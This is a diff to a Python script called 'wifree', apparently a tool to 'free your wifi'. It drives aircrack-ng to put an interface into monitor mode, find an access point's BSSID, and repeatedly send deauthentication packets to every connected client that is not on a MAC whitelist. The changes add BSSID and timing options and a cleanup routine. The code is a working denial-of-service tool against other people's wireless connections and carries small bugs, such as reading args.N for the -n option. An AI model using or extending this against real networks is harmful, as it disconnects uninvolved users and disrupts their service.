@@ -11,19 +11,33 @@ from WiFree.Aircrack.Aireplay import Aireplay
 
 parser = argparse.ArgumentParser(prog='wifree', description='Free your wifi.')
 parser.add_argument('-e', '--essid', help='Network essid')
+parser.add_argument('-b', '--bssid', help='Network bssid')
 parser.add_argument('-i', '--interface', help='Network interface to put in     \
                                                 monitor mode')
 parser.add_argument('-f', '--file', help='Configuration file')
 parser.add_argument('-w', '--whitelist', help='MAC whitelist, comma-separated')
 parser.add_argument('-n', help='Number of deauthentication packets to send')
+parser.add_argument('--max_sec', help='Max seconds to wait before choosing the \
+                                        closest AP')
+parser.add_argument('--max_attempts', help='Max attempts of max_sec secs')
 parser.add_argument('-v', '--verbose', help='Verbosity on/off')
 
 ESSID = ""
 BSSID = ""
 VERBOSE = False
 SEC = 5
-MAX_ATTEMPTS = 2
+MAX_ATTEMPTS = 1
 N = 10
+
+def abort(airmon, airodump):
+    if airmon.isDone():
+        print("\tDeactivating monitor mode on interface " + airmon.getMonitorInterface())
+        airmon.stop()
+    if airodump:
+        print("\tRemoving trash airodump-ng output")
+        os.system("rm " + airodump._airout + "-*")
+    raise
+
 
 if __name__ == '__main__':
     if os.geteuid() != 0:
@@ -54,60 +68,85 @@ if __name__ == '__main__':
     if args.whitelist:
         currentSettings.setWhitelist(" ".join(args.whitelist.split(",")))
     if args.verbose:
-        VERBOSE = True
+        currentSettings.setValue('verbose', "1")
     if args.n:
-        N = args.n
+        currentSettings.setValue('N', args.N)
+    if args.max_sec:
+        currentSettings.setValue('sec', args.max_sec)
+    if args.max_attempts:
+        currentSettings.setValue('max_attempts', args.max_attempts)
+    if args.bssid:
+        BSSID = args.bssid
 
-    if currentSettings.check_error():
+    if currentSettings.check_error(["verbose", "N", "sec", "max_attempts"]):
         print("ERROR: some setting options are missing")
         print("please check bot the config file and the command line")
         exit(-1)
+
+    VERBOSE = currentSettings.getValue('verbose')
+    VERBOSE = True if VERBOSE=="1" else False
+    N = currentSettings.getValue('N')
+    SEC = currentSettings.getValue('sec')
+    MAX_ATTEMPTS = currentSettings.getValue('max_attempts')
 
     if VERBOSE:
         print("Current settings: ")
         print("\tEssid: " + currentSettings.getEssid())
         print("\tInterface: " + currentSettings.getInterface())
         print("\tWhitelist: " + currentSettings.getWhitelist())
+        print("\tN: " + currentSettings.getValue('N'))
+        print("\tSEC: " + currentSettings.getValue('sec'))
+        print("\tMAX_ATTEMPTS: " + currentSettings.getValue('max_attempts'))
+        if BSSID:
+            print("\tBSSID: " + BSSID)
 
     airmon = Airmon(currentSettings.getInterface())
+    airodump = False
 
-    if not airmon.start():
-        print("ERROR: " + airmon.error)
-        print("Aborting...")
-        exit(-1)
+    try:
+        if not airmon.start():
+            print("ERROR: " + airmon.error)
+            print("Aborting...")
+            exit(-1)
 
-    print("Activated monitor mode on interface " + airmon.getInterface())
-    print("Monitor interface is " + airmon.getMonitorInterface())
+        print("Activated monitor mode on interface " + airmon.getInterface())
+        print("Monitor interface is " + airmon.getMonitorInterface())
 
-    airodump = Airodump(airmon.getMonitorInterface(), \
-                                        currentSettings.getEssid())
-    BSSID = airodump.getBSSID(SEC, MAX_ATTEMPTS)
-    if BSSID:
-        print("Got MAC of closest AP with essid " + currentSettings.getEssid() + ": " + BSSID)
-    else:
-        print("Couldn't get BSSID for essid " + currentSettings.getEssid())
-        print("Aborting...")
-        airmon.stop()
-        exit(-1)
+        airodump = Airodump(airmon.getMonitorInterface(), \
+                                    currentSettings.getEssid())
 
-    airodump.start(["--bssid", BSSID])
-    print("Waiting for connected clients...")
+        if not BSSID:
+            BSSID = airodump.getClosestBSSID(int(SEC), MAX_ATTEMPTS)
 
-    whitelist = set(currentSettings.getWhitelist().split(" "))
-    ESSID = currentSettings.getEssid()
+            if BSSID:
+                print("Got MACs of AP with essid " + currentSettings.getEssid() + ": " + BSSID)
+            else:
+                print("Couldn't get BSSID for essid " + currentSettings.getEssid())
+                print("Aborting...")
+                abort(airmon, airodump)
+                exit(-1)
+        else:
+            print("AP BSSID: " + BSSID)
 
-    aireplay = Aireplay(airmon.getMonitorInterface(), BSSID, airodump.getChannel(BSSID))
+        whitelist = set(currentSettings.getWhitelist().split(" "))
+        ESSID = currentSettings.getEssid()
 
-    while True:
-        try:
-            time.sleep(5)
+        while True:
+
+            airodump.start(["--bssid", BSSID])
+            print("Waiting for connected clients...")
+
+            time.sleep(10)
+
+            aireplay = Aireplay(airmon.getMonitorInterface(), BSSID, False)
 
             airodump.read_res()
+
             if not ESSID in airodump._clients:
                 print("No clients so far...")
                 if VERBOSE:
-                    print("clients: " + airodump._clients)
-                continue
+                    print("clients: " + str(airodump._clients))
+                    continue
 
             clients = set(airodump._clients[ESSID])
             toDeauth = clients-whitelist
@@ -123,10 +162,7 @@ if __name__ == '__main__':
                 if aireplay.deauth(N, cl):
                     print("\t...OK")
 
-        except (KeyboardInterrupt, Exception):
-            print("Got exception...")
-            print("\tDeactivating monitor mode on interface " + airmon.getMonitorInterface())
-            airmon.stop()
-            print("\tRemoving trash airodump-ng output")
-            os.system("rm " + airodump._airout + "-*")
-            raise
+    except (KeyboardInterrupt, Exception):
+        print("Got exception...")
+        abort(airmon, airodump)
+        raise
